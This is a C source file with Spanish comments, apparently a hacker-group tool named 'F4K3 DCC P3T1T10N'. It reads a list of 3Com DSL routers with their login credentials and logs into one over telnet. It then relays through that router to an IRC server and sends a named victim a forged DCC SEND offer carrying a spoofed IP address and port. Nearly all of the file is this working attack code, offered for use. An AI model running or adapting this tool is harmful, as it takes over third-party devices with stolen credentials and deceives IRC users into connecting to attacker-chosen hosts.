#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

//Definimos las constantes que usaremos mas tarde en el programa

#define SERVER "194.149.73.80" //ip del server: luna.irc-hispano.org

#define NICK "S_S"  //nick con el que nos vamos a logear

#define iFILE "IPs_Checked.txt"//archivo del cual debemos leer la info de los
                               //proxy 3com

#define SEP ':'           //carácter que separa IP, USER i PASS en iFILE

//Final del mensaje de bienvenida del server, sin el primer carácter
#define SER_END "ound your hostname."

//Definimos la estructura que va a almacenar la informacion de la iP leída
typedef struct{
   char ip[15];    //almacena la IP
   char user[20];  //almacena el user
   char pass[20];  //almacena el pass
} ip_info;

//Función que nos da la información de la IP leída en iFILE
ip_info *get_ip(void)
{
   ip_info *info_ip; //estructura donde guardaremos la información
   int j,i,iaux=0,random;   //variables necesarias para contadores
   char string[60];  //string donde se guarda la línea leída
   FILE *f;     //puntero al fichero

   //Si no podemos encontrar el file damos un error
   if( (f=fopen(iFILE,"r"))==NULL ){
      printf("Bad input file, revise the code ;)\n");
      exit(1); //Y salimos del programa
   }
   //Reservamos espacio para almacenar la estructura
   info_ip=(ip_info *)malloc(sizeof(ip_info));

   //Situamos el puntero del fichero a la posicion de inicio
   fseek(f,0x33,0);

   //Leemos el total de Ips en el archivo
   i=0;
   printf("\n");
   while( fscanf(f,"%s\n",string)!=EOF ){
      i++;
      //Imprimimos lo que vamos leyendo
      printf("\r\tCounting IPs in file %s: %d ",iFILE,i);
   }

   //Volvemos a poner el puntero del archivo en el punto donde empiezan
   //las IPs
   fseek(f,0x33,0);

   //Hacemos el random
   srand(time(NULL));
   random=rand()%(i+1);
   for( i=0; i<random ; i++){
       fscanf(f,"%s",string);
   }

   //Leemos la IP objetivo
   fscanf(f,"%s",string);

   //Dividimos string en IP, USER i PASS y lo almacenamos en la estructura
   i=0;
   for(j=0;j<3;j++){

      //Mientras sea distinto al carácter separador
      while( string[i+iaux]!=SEP ){
         switch(j){

            //primero vez, guardamos IP
            case 0 : info_ip->ip[i]=string[i];
                break;

            //incremento del for, guardamos user
            case 1 : info_ip->user[i]=string[i+iaux];
                break;

            //segundo incremento del for, guardamos pass
            case 2 : info_ip->pass[i]=string[i+iaux];
                break;
         }
         //incrementamos i
         i++;
      }
      //guardamos el desplazamiento del string leido
      iaux=iaux+i+1;
      i=0;
   }

   //escribimos el resultado de la busqueda por pantalla
   printf("\nUsing 3com ( %d ) [ IP: %s | USER: %s | PASS: %s]\n",
      random,info_ip->ip,info_ip->user,info_ip->pass);

   //devolvemos la dirección en la que se encuentra la estrcuctura
   return info_ip;
}


void author(void)
{
        printf("\n\tCoded by Sweet_Security <sweet_security@disidents.com>\n");
   printf("\t\t Disidents TeaM <www.disidents.com>\n\n");
}

//Imprime la manera de usar el programa
void usage(char* arg)
{
   printf("\nF4K3 DCC P3T1T10N\n");
   printf("\nUsage: %s [victim] [ip] [port] [file] [size]\n",arg);
   printf("\n\tOPTIONS:\n");
   printf("\t\t[victim] - Nick of the victim\n");
   printf("\t\t[ip] - Ip to spoof\n");
   printf("\t\t[port] - Port to do petition\n");
   printf("\t\t[file] - File to \"send\"\n");
   printf("\t\t[size] - Size of file\n");
   author();
}



//Función principal
main(int argc,char *argv[])
{
   //Declaramos variables
   ip_info *info_ip;   //puntero al que se le asigna la dirección
                       //devuelta por get_ip

   int sock,prompt=0;  //descriptor del socket y variable de prompt
   char pong[20],true_pong[20]; //strings para guardar el pong
   unsigned long ip; //variable para guardar la IP en long
   int i; //contador
   struct hostent *ip_spoof; //guardamos la información para poder
                              //conectar mediante sockets
   struct sockaddr_in ip_info;
   char IP[15]; //guardamos la IP a spoofear
   char *message; //lo usaremos para almacenar lo que nos vaya llegando
   char telnet[100]; //lo usaremos para poner los comandos a la hora de
                     //conectar

   //Si los argumentos son incorrectos sale imprimiendo su uso
   if( argc!=6 ){
      usage(argv[0]);
      exit(0);
   }

   //Si la IP/HOST dada es incorrecta da error y sale
   if( ! (ip_spoof=gethostbyname(argv[2]))){
      fprintf(stderr,"Couldn't resolve host\n");
      exit(1);
   }

   //Imprime la presentación
   printf("\n\n\t\t\tF4K3 DCC P3T1T10N\n");
   author();

   //Imprime la primera información sobre la IP dada
   printf("HOST GIVEN [ %s ] ",argv[2]);   //argumento dado
   printf("and RESOLVED as [ %s ]\n",ip_spoof->h_name); //nombre devuelto

   //copiamos la IP en formato string NUM:NUM:NUM:NUM
   strcpy(IP,inet_ntoa(*((struct in_addr *)ip_spoof->h_addr)));
   printf("IP [ %s ] ",IP); //escribimos la IP en el formato string

   //pasamos IP a host byte order
   ip=ntohl(inet_addr(IP));

   //imprimos IP en host byte order
   printf("in LONG [ (H.B.O): %lu |",ip);

   //imprimimos la IP en network byte order
   printf(" (N.B.O): %lu ]\n",htonl(ip));

   //Buscamos el proxy y asignamos en info_ip lo que devuelve
   info_ip=get_ip();

   //Assignamos los valores correctos a la estructura ip_info
   ip_info.sin_family=AF_INET;
   ip_info.sin_port=htons(23);
   ip_info.sin_addr.s_addr=inet_addr(info_ip->ip);

   //ponemos a 0 el resto de la estructura
   bzero(&(ip_info.sin_zero),8);

   //Si no se puede crear el socket da un error y sale
   if( (sock=socket(AF_INET,SOCK_STREAM,0))==-1 ){
      fprintf(stderr,"Couldn't create socket\n");
      exit(1);
   }

   //Si no puede conectar también da un error y sale
   if( connect(sock,(struct sockaddr *)&ip_info,sizeof(struct sockaddr))==-1 ){
      fprintf(stderr,"Couldn't connect to remote host\n");
      exit(1);
   }

   //vamos grabando los comandos en strings para luego enviarlas
   sprintf(telnet,"%s\r",info_ip->user);
   send(sock,telnet,strlen(telnet),0);
   sprintf(telnet,"%s\r",info_ip->pass);
   send(sock,telnet,strlen(telnet),0);

   //reservamos espacio para leer de 1 en 1 los bytes recibidos
   message=(char *)malloc(sizeof(char));

   //mientras no se reciba el prompt del servicio
   while( prompt==0){
      recv(sock,message,1,0);

      //miramos si el carácter es \r
      if( *message=='\r'){
         recv(sock,message,1,0);

         //miramos si el carácter es \n
         if( *message=='\n' ){

            //en ese caso es el prompt y lo leemos
            prompt=1;
            printf("\nPrompt: ");

            //recibimos el prompt completo
            while( *message!=62 ){
               recv(sock,message,1,0);
               if( *message=='\n' ){
                  printf("\t\t\t[ FAILED ]\n");
                  close(sock);
                  exit(1);
               }
               printf("%c",*message);
               fflush(stdout);
            }
         }
      }
   }
   //Ponemos el OK
   printf("\t[ OK ]\n");

   //escribimos y enviamos comando
   sprintf(telnet,"telnet %s tcp_port 6667\r",SERVER);
   send(sock,telnet,strlen(telnet),0);

   //esperamos a que conecte
   printf("\n\t\tSleeping 5 seconds..Waiting for connection...\n\n");
   sleep(5);

   //vamos leyendo hasta recibir el final de la presentacion del IRC
   /*Recibimos estas tres lineas:
    * 3Com-DSL>telnet 194.149.73.80 tcp_port 6667
    * Trying 194.149.73.80 ...
    * :luna.irc-hispano.org NOTICE IP_LOOKUP :*** Looking up your hostname...
    * :luna.irc-hispano.org NOTICE IP_LOOKUP :*** Found your hostname.
    *
   */
   for( i=0; i<3 ;i++){
      while( *message!='\r' )
         recv(sock,message,1,0);
       recv(sock,message,1,0);
   }
   fflush(stdout);

   //ahora empezamos a identificarnos en la red IRC
   printf("Starting login process\n\n");
   sprintf(telnet,"\ruser %s localhost localhost :idem\r",NICK);
   send(sock,telnet,strlen(telnet),0);
   sprintf(telnet,"nick %s\n",NICK);
   send(sock,telnet,strlen(telnet),0);
   printf("\t[ OK ] LOGIN PROTOCOL\n");
   fflush(stdout);

   //una vez hecho el protocolo esperamos a recibir el PING
   while( *message!='P' ){
      recv(sock,message,1,0);
   }
   while( *message!=' ' ){
      recv(sock,message,1,0);
   }
   printf("\t[ OK ] PING\n");
   fflush(stdout);
   recv(sock,message,1,0);

   i=0;

   //recibimos el numero con el que tenemos que responder
   //y lo almacenamos en la string pong
   while( *message!=13){
      pong[i]=*message;
      i++;
      recv(sock,message,1,0);
   }

   //le ponemos el final de cadena a la string
   pong[i]='\r';
   printf("\t[ OK ] PONG\n"); //printeamos el buen funcionamiento de todo
   fflush(stdout);
   sprintf(telnet,"PONG %s",pong);
   send(sock,telnet,5+i+1,0); //enviamos el pong
   printf("\n\tEverything OK\n"); //Y ya estamos conectados
   printf("\neXploiting : Sending fake sentence.... "); //enviamos pues la
                                                   //sentencia falseada
   fflush(stdout);

   //la ponemos en la cadena telnet, con todas las variables
   sprintf(telnet,"privmsg %s :\001DCC SEND %s %lu %s %s\001\r",
                                     argv[1],argv[4],ip,argv[3],argv[5]);

   //y lo enviamos
   send(sock,telnet,strlen(telnet),0);

   //esperamos a que surja efecto
   sleep(2);
   printf("SENT!\n");

   //Hacemos que el bot este alive hasta que se presione "q" o bien
   //le llegue un PING y no sea respondido
   while(*message!='q'){
      printf("Press \"q\" and hit enter to quit BoT from IRC: ");
      fflush(stdout);
      *message=getchar();
      while( getchar()!=10);

   }
   //quitamos de IRC
   sprintf(telnet,"quit\r");
   send(sock,telnet,strlen(telnet),0);
   sleep(0.5);

   //quitamos del 3com
   send(sock,telnet,strlen(telnet),0);
   printf("Connection closed from remote host\n");

   //imprimimos el autor
   author();

   //y cerramos el socket
   close(sock);
}